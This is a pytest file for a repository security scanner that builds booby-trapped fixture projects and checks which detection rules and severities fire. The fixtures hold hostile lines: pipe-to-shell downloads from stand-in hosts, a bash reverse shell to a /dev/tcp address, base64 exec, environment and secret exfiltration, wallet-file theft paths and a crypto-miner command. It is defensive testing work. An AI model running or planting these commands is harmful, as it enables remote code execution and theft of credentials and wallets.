"""Characterization tests: the booby-trapped fixture must trip the rules, the clean one must not."""

import json
import os
import subprocess
import sys
import tarfile
from importlib import resources
from pathlib import Path

import pytest

from sandbox_scan.pack import pack
from sandbox_scan.report import Incomplete, verdict
from sandbox_scan.textutil import clean

SCANNER = str(resources.files("sandbox_scan").joinpath("remote_scanner.py"))


def scan(root: Path) -> set[str]:
    out = subprocess.run([sys.executable, "-I", SCANNER, str(root)], capture_output=True, text=True, check=True)
    return {f["rule"] for f in json.loads(out.stdout)["findings"]}


def write(root: Path, rel: str, text: str) -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)


@pytest.fixture
def evil(tmp_path: Path) -> Path:
    write(
        tmp_path, "package.json", json.dumps({"scripts": {"postinstall": "node x.js"}, "dependencies": {"lodas": "1"}})
    )
    write(tmp_path, "requirements.txt", "requestss==1\n")
    write(tmp_path, ".vscode/tasks.json", '{"tasks":[{"runOptions":{"runOn": "folderOpen"}}]}')
    write(tmp_path, "run.sh", "curl http://x.example/a | sh\n")
    write(tmp_path, "a.py", "import base64\nexec(base64.b64decode('eA=='))\n")
    write(tmp_path, ".git/hooks/pre-commit", "#!/bin/sh\n")
    (tmp_path / "link").symlink_to("/etc")
    return tmp_path


def test_evil_repo_trips_rules(evil: Path) -> None:
    assert {
        "npm-lifecycle-script",
        "typosquat?",
        "vscode-autorun-task",
        "pipe-to-shell",
        "b64-exec",
        "git-hook",
        "symlink-escape",
    } <= scan(evil)


def test_binary_hidden_in_node_modules_bin_is_flagged(tmp_path: Path) -> None:
    p = tmp_path / "node_modules/.bin/tool"
    p.parent.mkdir(parents=True)
    p.write_bytes(b"\x7fELF" + b"\x00" * 64)
    assert "binary-executable" in scan(tmp_path)


def test_clean_repo_has_no_findings(tmp_path: Path) -> None:
    write(tmp_path, "main.py", "print('hello')\n")
    write(tmp_path, "package.json", json.dumps({"scripts": {"test": "jest"}, "dependencies": {"lodash": "4"}}))
    assert scan(tmp_path) == set()


@pytest.mark.parametrize(
    ("sevs", "notes", "label", "rc"),
    [
        (["CRITICAL", "HIGH"], [], "DO NOT USE", 2),
        (["HIGH"], [], "SUSPICIOUS - MANUAL REVIEW REQUIRED", 1),
        (["MEDIUM"], [Incomplete("Semgrep results missing")], "INCONCLUSIVE - SCAN INCOMPLETE", 1),
        (["MEDIUM"], [], "NO RED FLAGS, BUT REVIEW THE NOTES", 0),
        ([], [], "NO KNOWN RED FLAGS", 0),
    ],
)
def test_verdict(sevs: list[str], notes: list[str], label: str, rc: int) -> None:
    assert verdict([{"severity": s} for s in sevs], notes) == (label, rc)


def test_pack_strips_dangerous_modes(tmp_path: Path) -> None:
    src = tmp_path / "src"
    src.mkdir()
    f = src / "a.sh"
    f.write_text("x")
    os.chmod(f, 0o4777)
    pack(src, tmp_path / "c.tgz", 10)
    with tarfile.open(tmp_path / "c.tgz") as tf:
        assert tf.getmember("a.sh").mode == 0o755


def test_pack_rejects_oversize(tmp_path: Path) -> None:
    (tmp_path / "a.bin").write_bytes(b"0" * 2_000_000)
    with pytest.raises(SystemExit):
        pack(tmp_path, tmp_path.parent / "c.tgz", 1)


def test_clean_strips_escapes_and_bidi() -> None:
    assert clean("a\x1b[31m‮b") == "a?[31m?b"


def findings(root: Path) -> list[dict[str, str]]:
    out = subprocess.run([sys.executable, "-I", SCANNER, str(root)], capture_output=True, text=True, check=True)
    return json.loads(out.stdout)["findings"]


def test_dependency_and_build_folders_become_one_medium_line_each(tmp_path: Path) -> None:
    write(tmp_path, "node_modules/lib/a.js", "curl http://evil.invalid/x | sh\n")
    write(tmp_path, "node_modules/lib/b.js", "bash -i >& /dev/tcp/203.0.113.1/4444 0>&1\n")
    (tmp_path / "target/debug").mkdir(parents=True)
    (tmp_path / "target/debug/app").write_bytes(b"\x7fELF" + b"\x00" * 64)
    fs = findings(tmp_path)
    assert {f["severity"] for f in fs} == {"MEDIUM"}
    by_file = {f["file"]: f["detail"] for f in fs if f["rule"] == "dependency-findings"}
    assert set(by_file) == {"node_modules", "target"}
    assert "pipe-to-shell" in by_file["node_modules"]  # the summary still says what was seen


def test_normal_venv_python_symlink_is_not_flagged_but_a_hostile_one_is(tmp_path: Path) -> None:
    (tmp_path / ".venv/bin").mkdir(parents=True)
    (tmp_path / ".venv/bin/python3").symlink_to("/usr/bin/python3")
    assert "symlink-escape" not in scan(tmp_path)
    (tmp_path / ".venv/bin/helper").symlink_to("/etc/passwd")
    assert "symlink-escape" in scan(tmp_path)


def test_env_exfil_flags_the_whole_environment_not_one_variable(tmp_path: Path) -> None:
    write(tmp_path, "ok.js", "fetch(process.env.API_URL + '/users')\n")
    assert "env-exfil" not in scan(tmp_path)
    write(tmp_path, "bad.js", "fetch(u, {body: JSON.stringify(process.env)})\n")
    write(tmp_path, "bad.py", "requests.post(u, data=dict(os.environ))\n")
    fs = [f["file"] for f in findings(tmp_path) if f["rule"] == "env-exfil"]
    assert sorted(fs) == ["bad.js", "bad.py"]


def test_bidi_in_a_data_file_is_medium_but_in_code_is_high(tmp_path: Path) -> None:
    write(tmp_path, "data.json", '{"t": "abc‮def"}\n')
    assert {f["severity"] for f in findings(tmp_path) if f["rule"] == "trojan-source"} == {"MEDIUM"}
    write(tmp_path, "x.js", "var a = 'abc‮def';\n")
    sev = {f["file"]: f["severity"] for f in findings(tmp_path) if f["rule"] == "trojan-source"}
    assert sev == {"data.json": "MEDIUM", "x.js": "HIGH"}


def macho(filetype: int) -> bytes:
    return b"\xcf\xfa\xed\xfe" + b"\x07\x00\x00\x01\x03\x00\x00\x00" + filetype.to_bytes(4, "little") + b"\x00" * 32


def test_object_files_are_medium_but_executables_stay_high(tmp_path: Path) -> None:
    (tmp_path / "obj").mkdir()
    (tmp_path / "obj/x.o").write_bytes(macho(1))  # MH_OBJECT
    (tmp_path / "obj/run").write_bytes(macho(2))  # MH_EXECUTE, name does not matter
    elf_obj = b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * 9 + (1).to_bytes(2, "little") + b"\x00" * 32
    (tmp_path / "obj/y.o").write_bytes(elf_obj)
    got = {f["file"]: f["severity"] for f in findings(tmp_path) if "binary" in f["rule"]}
    assert got == {"obj/x.o": "MEDIUM", "obj/y.o": "MEDIUM", "obj/run": "HIGH"}


def test_typosquat_catches_swapped_letters(tmp_path: Path) -> None:
    write(tmp_path, "package.json", json.dumps({"dependencies": {"lodahs": "1"}}))
    assert "typosquat?" in scan(tmp_path)


def test_semgrep_stderr_is_shipped_back_and_shown(tmp_path: Path) -> None:
    from sandbox_scan.report import merge_findings, read_results

    tgz = tmp_path / "r.tgz"
    (tmp_path / "semgrep.err").write_text("rule download failed")
    with tarfile.open(tgz, "w:gz") as tf:
        tf.add(tmp_path / "semgrep.err", arcname="semgrep.err")
    _, _, notes, _ = merge_findings(read_results(tgz))
    assert any("rule download failed" in n for n in notes)


def test_dependency_findings_are_listed_before_other_medium_lines() -> None:
    from sandbox_scan.report import merge_findings

    others = [
        {"severity": "MEDIUM", "rule": "x", "file": f"a{i}", "line": 1, "detail": "", "snippet": ""} for i in range(20)
    ]
    dep = {"severity": "MEDIUM", "rule": "dependency-findings", "file": "zzz", "line": 0, "detail": "", "snippet": ""}
    import json as j

    res = {"heuristics.json": j.dumps({"findings": [*others, dep], "stats": {}})}
    findings_, *_ = merge_findings(res)
    assert findings_[0]["rule"] == "dependency-findings"


def test_symlink_out_of_project_is_high_only_when_the_target_is_sensitive(tmp_path: Path) -> None:
    (tmp_path / "cache_log").symlink_to("/Users/someone/Library/Caches/wandb/log")
    (tmp_path / "key").symlink_to("/home/u/.ssh/id_ed25519")
    (tmp_path / "etc").symlink_to("/etc/passwd")
    sev = {f["file"]: f["severity"] for f in findings(tmp_path) if f["rule"] == "symlink-escape"}
    assert sev == {"cache_log": "MEDIUM", "key": "HIGH", "etc": "HIGH"}


def test_results_tar_with_too_many_members_is_not_trusted(tmp_path: Path) -> None:
    from sandbox_scan.report import read_results

    tgz = tmp_path / "r.tgz"
    (tmp_path / "x").write_text("x")
    with tarfile.open(tgz, "w:gz") as tf:
        for i in range(500):
            tf.add(tmp_path / "x", arcname=f"junk{i}")
        tf.add(tmp_path / "x", arcname="heuristics.json")
    assert "heuristics.json" not in read_results(tgz)  # a compromised VM cannot make us walk a huge archive


def test_incomplete_is_a_flag_not_a_word_in_the_text() -> None:
    from sandbox_scan.report import Incomplete

    assert verdict([], ["scan INCOMPLETE (a plain note quoting the word)"])[1] == 0
    assert verdict([], [Incomplete("semgrep missing")])[0] == "INCONCLUSIVE - SCAN INCOMPLETE"


def test_one_secret_named_variable_sent_over_the_network_is_medium(tmp_path: Path) -> None:
    write(tmp_path, "a.js", "fetch(u, {body: process.env.NPM_TOKEN})\n")
    write(tmp_path, "b.py", "requests.post(u, data=os.environ['AWS_SECRET_ACCESS_KEY'])\n")
    write(tmp_path, "c.js", "fetch(process.env.API_URL)\n")  # a URL setting, not a secret
    got = {f["file"]: f["severity"] for f in findings(tmp_path) if f["rule"] == "env-secret-send"}
    assert got == {"a.js": "MEDIUM", "b.py": "MEDIUM"}


def test_wallet_theft_patterns(tmp_path: Path) -> None:
    write(
        tmp_path,
        "ext.js",
        "const p = home + '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';\n",
    )
    write(tmp_path, "exo.py", "open(os.path.expanduser('~/.config/Exodus/exodus.wallet/seed.seco'), 'rb')\n")
    write(tmp_path, "sol.js", "fs.readFileSync(os.homedir() + '/.config/solana/id.json')\n")
    write(tmp_path, "seed.js", "fetch(hook, {body: JSON.stringify({mnemonic})})\n")
    write(tmp_path, "clip.py", "import re; ADDR = re.compile(r'0x[a-fA-F0-9]{40}')  # swap in the attacker address\n")
    write(tmp_path, "ok.js", "// MetaMask is a popular wallet\nconsole.log('connect wallet')\n")
    sev = {
        f["file"]: f["rule"] + ":" + f["severity"]
        for f in findings(tmp_path)
        if "wallet" in f["rule"] or f["rule"] in ("seed-phrase-send", "crypto-address-regex")
    }
    assert sev == {
        "ext.js": "wallet-theft:HIGH",
        "exo.py": "wallet-theft:HIGH",
        "sol.js": "wallet-theft:HIGH",
        "seed.js": "seed-phrase-send:MEDIUM",
        "clip.py": "crypto-address-regex:MEDIUM",
    }


def test_guarddog_stderr_is_shown_when_it_produced_no_result(tmp_path: Path) -> None:
    from sandbox_scan.report import merge_findings, read_results

    (tmp_path / "guarddog_npm.err").write_text("guarddog crashed: boom")
    tgz = tmp_path / "r.tgz"
    with tarfile.open(tgz, "w:gz") as tf:
        tf.add(tmp_path / "guarddog_npm.err", arcname="guarddog_npm.err")
    _, _, notes, _ = merge_findings(read_results(tgz))
    assert any("guarddog (npm)" in n and "boom" in n for n in notes)


def test_held_out_false_positives_stay_quiet(tmp_path: Path) -> None:
    """Found by scanning unseen projects (flask, axios, express, fastapi and the author's docs)."""
    write(tmp_path, "docs.md", "install: curl -L https://x.invalid/i.sh | sh\n")
    write(tmp_path, "app.py", 'exec(compile(config_file.read(), filename, "exec"), d.__dict__)\n')
    write(tmp_path, "t.js", "const m = {'stratum+tcp://server:port': 'stratum+tcp'};\n")
    write(
        tmp_path,
        "package.json",
        json.dumps({"scripts": {"prepare": "husky"}, "dependencies": {"qs": "6", "preact": "10"}}),
    )
    sev = {f["rule"]: f["severity"] for f in findings(tmp_path)}
    assert "typosquat?" not in sev  # two-letter names and preact are not typosquats
    assert "cryptominer" not in sev and "npm-lifecycle-script" not in sev
    assert sev == {"pipe-to-shell": "MEDIUM", "dyn-exec": "MEDIUM"}  # still listed, no longer alarming


def test_still_flagged_after_the_held_out_tuning(tmp_path: Path) -> None:
    write(tmp_path, "a.py", "exec(compile(base64.b64decode(blob), 'x', 'exec'))\n")
    write(tmp_path, "m.sh", "./xmrig -o stratum+tcp://pool.invalid:3333\n")
    write(tmp_path, "run.sh", "curl http://x.invalid/a | sh\n")  # a script, not a doc
    write(
        tmp_path,
        "package.json",
        json.dumps({"scripts": {"postinstall": "node steal.js"}, "dependencies": {"lodahs": "1"}}),
    )
    got = {f["rule"]: f["severity"] for f in findings(tmp_path)}
    assert got["pipe-to-shell"] == "CRITICAL" and got["cryptominer"] == "HIGH"
    assert got["npm-lifecycle-script"] == "HIGH" and got["typosquat?"] == "HIGH"
    assert got.get("b64-exec") == "CRITICAL" or got["py-exec-compile"] in ("HIGH", "CRITICAL")
